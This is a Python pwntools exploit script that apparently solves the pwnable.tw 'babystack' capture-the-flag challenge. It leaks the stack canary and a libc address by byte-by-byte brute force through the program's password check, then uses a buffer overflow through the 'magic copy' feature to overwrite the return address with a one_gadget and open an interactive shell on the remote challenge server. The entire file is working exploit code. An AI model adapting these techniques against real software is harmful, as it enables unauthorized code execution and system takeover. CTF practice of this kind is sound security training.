#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("babystack_patched", checksec=False)
libc = ELF("libc_64.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
breakrva 0xEBB
breakrva 0x1052
# breakrva 0xE1E
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10205
        return remote(host, port)

p = conn()

def login(pw):
    sla(p, b'>>', b'1')
    sa(p, b'passowrd', pw)

def magic_copy(pl):
    sla(p, b'>>', b'3')
    sa(p, b'Copy', pl)
    sleep(0.01)

def bf(result_len, init=b''):
    result = init
    last_correct = False
    while len(result) < result_len:
        print(result)
        for i in range(1, 0xff):
            slan(p, b'>>', 1)
            if last_correct:
                last_correct = False
                break
            sla(p, b'passowrd', result + p8(i))
            if b"Failed" in rl(p):
                continue
            else:
                last_correct = True
                result += p8(i)
    return result

# Brute force canary
print("Leaking canary")
canary = bf(16)
print(f"canary -> {canary}")

# Copy libc address
login(b'\0' + pad(63) + pad(8))
magic_copy(pad(63))

slan(p, b'>>', 1)

# Brute force libc
print("Leaking libc")
leak_libc = bf(14, pad(8))
libc.address = leak_bytes(leak_libc[8:], 0x78439)
lg("libc base", libc.address)

print("Spawn shell")
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL
'''
one_gadget = libc.address + 0x45216
lg("one gadget", one_gadget)

login(flat(
    b'\0',
    pad(63),
    canary,
    pad(104 - 64 - 16),
    one_gadget
))
magic_copy(pad(63))

slan(p, b'>>', 2)

ia(p)